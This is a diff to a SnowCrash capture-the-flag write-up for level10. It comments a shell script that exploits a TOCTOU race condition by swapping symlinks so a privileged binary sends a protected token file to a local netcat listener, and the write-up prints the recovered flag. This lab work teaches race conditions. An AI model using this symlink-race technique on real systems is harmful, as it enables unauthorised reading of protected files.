@@ -58,8 +58,7 @@ level10@SnowCrash:~$ while :; do nc -l 6969; done
 .*( )*.
 
 # VM 2 run
-level10@SnowCrash:~$ touch /tmp/token10
-level10@SnowCrash:~$ while :; do nice -n 20 ./level10 /tmp/token10 127.0.0.1; done	# Note nice it to to lower the priority as low as possible
+level10@SnowCrash:~$ touch /tmp/token10; while :; do nice -n 20 ./level10 /tmp/token10 127.0.0.1; done	# Note nice it to to lower the priority as low as possible
 Connecting to 127.0.0.1:6969 .. Connected!
 Sending file .. wrote file!
 
@@ -78,11 +77,11 @@ while [ 42 ] ; do nc -l 6969; done
 
 vim raceExploit.sh
 #!/bin/sh
-touch /tmp/gabe
+touch /tmp/gabe														# Note gabe is a place holder file just use to exploit the race condition
   while true; do
-       ln -sf /tmp/gabe /tmp/copyToken  &
-       /home/user/level10/level10 /tmp/copyToken 127.0.0.1 &
-       ln -sf /home/user/level10/token /tmp/copyToken &
+       ln -sf /tmp/gabe /tmp/copyToken  &							# This will symlink the files then will remove it after
+       /home/user/level10/level10 /tmp/copyToken 127.0.0.1 &		# using the now symlink file to slow down the process of ./level10 excecuteable
+       ln -sf /home/user/level10/token /tmp/copyToken &				# symlink the token file with our file in hopes that the race condition is triggered and the program runs our token with it linked to their token. Remember that the system is slowed down so that timing events don't run as they should.
   done
 
 # Note you will need 2 terminals conntected to the ssh level10@192.168.56.101 -p 4242
@@ -110,7 +109,9 @@ Check flag.Here is your token : feulo4b72j7edeahuete3no7c
 # We learnt about race conditions
 
 Resources
+https://www.win.tue.nl/~aeb/linux/hh/hh-9.html
 https://linux.die.net/man/1/nc
+https://linux.die.net/man/1/ln
 https://books.google.co.za/books?id=xpSSXvoQBq4C&pg=PA178&lpg=PA178&dq=what+localhost+5151&source=bl&ots=SqC25oe3eL&sig=ytJE2dfwMrG6ZMdjQfLyKKwNoaI&hl=en&sa=X&redir_esc=y#v=onepage&q=what%20localhost%205151&f=false
 https://www.lifewire.com/uses-of-commands-nice-renice-2201087
 https://www.mattandreko.com/2011/12/11/exploit-exercises-nebula-10/
